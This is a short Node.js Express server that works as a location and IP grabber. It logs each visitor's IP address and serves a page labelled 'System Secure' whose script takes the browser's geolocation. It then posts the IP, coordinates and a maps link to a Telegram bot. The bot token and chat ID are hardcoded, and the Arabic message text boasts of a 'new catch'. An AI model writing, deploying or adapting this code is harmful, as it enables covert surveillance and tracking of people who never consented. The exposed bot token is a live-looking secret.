const express = require('express');
const axios = require('axios');
const app = express();

const BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8";
const CHAT_ID = "6315285444";

app.get('/', async (req, res) => {
    const { mode, lat, lon } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (mode) {
        let msg = `☢️ <b>صيد جديد بواسطة عمر مدهش</b>\n⚙️ <b>العملية:</b> ${mode}\n📍 <b>IP:</b> <code>${ip}</code>`;
        if (lat) msg += `\n🗺️ <b>الموقع:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">فتح الخريطة</a>`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'
        });
    }
    res.send("<h1>System Secure</h1><script>navigator.geolocation.getCurrentPosition(p=>{location.href+='&lat='+p.coords.latitude+'&lon='+p.coords.longitude})</script>");
});

app.listen(process.env.PORT || 10000);
